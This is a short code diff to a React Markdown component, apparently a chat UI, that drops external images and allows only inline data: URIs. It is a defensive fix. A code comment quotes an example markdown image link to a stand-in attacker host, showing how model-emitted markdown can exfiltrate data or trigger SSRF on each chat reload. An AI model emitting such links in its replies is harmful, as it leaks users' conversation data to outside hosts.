@@ -157,6 +157,22 @@ export function Markdown({ children }: { children: string }) {
           />
         ),
         hr: () => <hr className="my-4 border-[hsl(var(--border))]" />,
+        // Drop external image sources entirely — model-emitted markdown can
+        // contain `![](http://attacker.tld/log)` which would fire a GET on
+        // every chat reload (exfil / LAN SSRF from localhost). Allow only
+        // inline data: URIs, which are self-contained.
+        img: ({ src, alt }) => {
+          if (typeof src === "string" && src.startsWith("data:")) {
+            // eslint-disable-next-line @next/next/no-img-element
+            return <img src={src} alt={alt ?? ""} className="my-2 max-w-full" />;
+          }
+          const label = alt || (typeof src === "string" ? src : "no source");
+          return (
+            <span className="my-2 inline-block rounded border border-[hsl(var(--border))] px-2 py-1 text-xs text-muted-foreground">
+              [image dropped: {label}]
+            </span>
+          );
+        },
         table: (p) => (
           <div className="my-3 overflow-x-auto">
             <table
